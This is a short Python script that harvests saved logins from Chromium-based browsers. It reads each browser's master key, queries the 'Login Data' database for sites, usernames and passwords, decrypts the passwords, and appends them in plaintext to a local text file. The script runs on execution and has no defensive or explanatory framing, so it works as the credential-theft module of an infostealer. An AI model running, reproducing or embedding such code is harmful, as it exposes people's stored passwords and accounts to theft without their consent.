
# Import modules
from __init__ import GetMasterKey, FetchDataBase, DecryptValue, GetBrowsers

""" Fetch passwords from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Login Data", "SELECT action_url, username_value, password_value FROM logins")
        i=1
        for row in database:
            password = {
                "hostname": row[0],
                "username": row[1],
                "password": DecryptValue(row[2], master_key)
            }
            credentials.append(password)
            with open("output_file_password.txt", "a") as file:
            	scrittura= str(i) + f") {str(password)}"
            	file.write(scrittura)
            	file.write("\n")
            i=i+1


    return credentials

Get()